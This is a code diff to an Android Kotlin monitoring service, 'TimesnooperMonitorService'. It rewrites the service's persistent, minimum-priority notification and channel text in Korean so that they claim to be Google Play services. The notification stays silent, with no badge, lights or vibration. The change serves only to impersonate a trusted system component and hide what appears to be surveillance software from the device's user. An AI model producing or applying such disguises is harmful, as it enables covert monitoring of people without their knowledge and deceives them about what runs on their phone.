@@ -81,8 +81,8 @@ class TimesnooperMonitorService : Service() {
 
     private fun createSilentNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("시스템 보안 및 동기화")
-            .setContentText("기기 상태 및 백그라운드 서비스 활성 중")
+            .setContentTitle("Google Play 서비스 지원")
+            .setContentText("보안 및 시스템 백그라운드 서비스 최적화 중")
             .setSmallIcon(android.R.drawable.ic_menu_agenda)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
@@ -94,10 +94,10 @@ class TimesnooperMonitorService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "시스템 상태 서비스",
+                "Google Play 서비스 시스템 채널",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "백그라운드 동기화 채널"
+                description = "Google Play 백그라운드 보안 및 안정성 유지 채널"
                 setShowBadge(false)
                 enableLights(false)
                 enableVibration(false)
